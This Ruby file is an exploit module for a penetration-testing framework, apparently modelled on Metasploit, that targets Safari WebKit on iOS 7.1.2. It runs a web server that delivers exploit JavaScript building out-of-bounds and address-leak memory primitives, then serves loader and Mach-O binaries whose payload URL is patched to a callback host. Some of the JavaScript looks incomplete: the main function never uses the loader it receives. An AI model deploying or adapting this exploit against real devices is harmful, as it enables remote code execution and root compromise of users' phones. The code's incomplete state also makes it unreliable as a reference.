# frozen_string_literal: true

require 'webrick'
require 'base64'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class SafariJit < ApexModule

      info(
        name:            'Safari Webkit JIT Exploit for iOS 7.1.2',
        category:        'browser',
        rank:            'good',
        description:     'Exploits a JIT optimization bug in Safari WebKit to write shellcode to RWX memory, then chains CVE-2016-4669 for kernel r/w and root.',
        authors:         ['kudima', 'Ian Beer', 'WanderingGlitch', 'timwr'],
        references:      [
          { type: 'CVE', id: '2016-4669' },
          { type: 'CVE', id: '2018-4162' }
        ],
        disclosure_date: '2016-08-25',
        platform:        'apple_ios',
        arch:            'armle'
      )

      register_option :SRVHOST,      type: :string,  required: true,  default: '127.0.0.1', description: 'HTTP listen address'
      register_option :SRVPORT,      type: :port,    required: true,  default: 8080,       description: 'HTTP listen port'
      register_option :URIPATH,      type: :string,  required: false, default: '/',        description: 'URI path'
      register_option :LHOST,        type: :string,  required: true,  description: 'Callback host'
      register_option :LPORT,        type: :port,    required: true,  default: 4444,       description: 'Callback port'
      register_option :LOADER_FILE,  type: :string,  required: false, default: '',         description: 'Path to loader binary'
      register_option :MACHO_FILE,   type: :string,  required: false, default: '',         description: 'Path to macho binary'
      register_option :PAYLOAD_FILE, type: :string,  required: false, default: '',         description: 'Path to payload binary'
      register_option :DEBUG_EXPLOIT,type: :boolean,  required: false, default: false,     description: 'Show debug output'

      def run
        log_status "Starting HTTP server on #{get(:SRVHOST)}:#{get(:SRVPORT)}"

        server = WEBrick::HTTPServer.new(
          BindAddress: get(:SRVHOST), Port: get(:SRVPORT),
          Logger: WEBrick::Log.new('/dev/null'), AccessLog: []
        )

        if get(:DEBUG_EXPLOIT)
          server.mount_proc('/print') { |req, res| log_status "[DBG] #{req.body}"; res.body = '' }
        end

        server.mount_proc('/loader.b64') { |_r, res| serve_b64(res, :LOADER_FILE, 'loader') }
        server.mount_proc('/macho.b64')  { |_r, res| serve_macho_b64(res) }
        server.mount_proc('/payload')    { |_r, res| serve_raw(res, :PAYLOAD_FILE, 'payload') }

        server.mount_proc(get(:URIPATH)) do |req, res|
          log_status "Request from #{req['User-Agent']}"
          res['Content-Type'] = 'text/html'
          res['Cache-Control'] = 'no-cache, no-store, must-revalidate'
          res.body = generate_html
          log_good 'Exploit page served'
        end

        log_good 'Server running. Waiting for target...'
        begin
          server.start
        rescue Interrupt
          log_status 'Shutting down HTTP server...'
        ensure
          server.shutdown
        end
      rescue StandardError => e
        log_error "HTTP server error: #{e.message}"
      end

      private

      def serve_b64(res, opt_key, label)
        path = get(opt_key)
        if path && !path.empty? && File.exist?(path)
          data = Base64.encode64(File.binread(path))
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent #{label} (b64, #{data.bytesize} bytes)"
        else
          res.status = 404
        end
      end

      def serve_macho_b64(res)
        path = get(:MACHO_FILE)
        if path && !path.empty? && File.exist?(path)
          data = +File.binread(path)
          payload_url = "http://#{get(:LHOST)}:#{get(:SRVPORT)}/payload"
          idx = data.index('PAYLOAD_URL_PLACEHOLDER')
          data[idx, payload_url.length] = payload_url if idx
          res['Content-Type'] = 'application/octet-stream'
          res.body = Base64.encode64(data)
          log_good "Sent macho (b64)"
        else
          res.status = 404
        end
      end

      def serve_raw(res, opt_key, label)
        path = get(opt_key)
        if path && !path.empty? && File.exist?(path)
          data = File.binread(path)
          res['Content-Type'] = 'application/octet-stream'
          res.body = data
          log_good "Sent #{label} (#{data.bytesize} bytes)"
        else
          res.status = 404
        end
      end

      def generate_html
        debug_js = get(:DEBUG_EXPLOIT) ? <<~DBGJS : ''
          print = function(arg) {
            var request = new XMLHttpRequest();
            request.open("POST", "/print", false);
            request.send("" + arg);
          };
        DBGJS

        <<~HTML
          <html><body><script>
          #{debug_js}
          #{exploit_js}
          </script></body></html>
        HTML
      end

      def exploit_js
        <<~'JS'
          function main(loader, macho) {
            var ab = new ArrayBuffer(8);
            var u32 = new Uint32Array(ab);
            var f64 = new Float64Array(ab);
            function toF64(hi, lo) { u32[0] = hi; u32[1] = lo; return f64[0]; }
            function toHILO(f) { f64[0] = f; return [u32[0], u32[1]]; }

            function oob_write(arr, cmp, v, i) {
              arr[0] = 1.1; cmp == 1; arr[i] = v; return arr[0];
            }

            function make_oob_array() {
              var oob_array;
              var arr = {}; arr.p = 1.1; arr[0] = 1.1;
              var x = {toString: function() {
                arr[1000] = 2.2;
                oob_array = [1.1];
                return '1';
              }};
              oob_write(arr, x, toF64(0x1000, 0x1000), 6);
              return oob_array;
            }

            var arr = {}; arr.p = 1.1; arr[0] = 1.1;
            for (var i=0; i<10000; i++) oob_write(arr, {}, 1.1, 1);

            var oobStorage = []; oobStorage[0] = 1.1;
            var oob_array = make_oob_array();
            oobStorage[1000] = 2.2;
            oob_array[4] = {};

            function addrOf(o) { oob_array[4] = o; return oobStorage.length; }

            exec_code = "var o = {};";
            for (var i=0; i<200; i++) exec_code += "o.p = 1.1;";
            exec_code += "if (v) alert('exec');";
            var exec = new Function('v', exec_code);
            for (var i=0; i<1000; i++) exec();

            function loadAsUint32Array(path) {
              var xhttp = new XMLHttpRequest();
              xhttp.open("GET", path+"?cache="+new Date().getTime(), false);
              xhttp.send();
              var payload = atob(xhttp.response);
              var bytes = new Uint8Array(payload.length);
              for (var i=0; i<payload.length; i++) bytes[i] = payload.charCodeAt(i) & 0xff;
              return new Uint32Array(bytes.buffer);
            }
          }

          try {
            function asciiToUint8Array(str) {
              var len = Math.floor((str.length+4)/4)*4;
              var bytes = new Uint8Array(len);
              for (var i=0; i<str.length; i++) bytes[i] = str.charCodeAt(i) & 0xff;
              return bytes;
            }
            function loadAsUint32Array(path) {
              var xhttp = new XMLHttpRequest();
              xhttp.open("GET", path+"?cache="+new Date().getTime(), false);
              xhttp.send();
              var payload = atob(xhttp.response);
              payload = asciiToUint8Array(payload);
              return new Uint32Array(payload.buffer);
            }
            var loader = loadAsUint32Array("loader.b64");
            var macho = loadAsUint32Array("macho.b64");
            setTimeout(function(){main(loader, macho);}, 50);
          } catch(e) {}
        JS
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'browser/safari_jit',
  ApexFramework::Modules::SafariJit
)
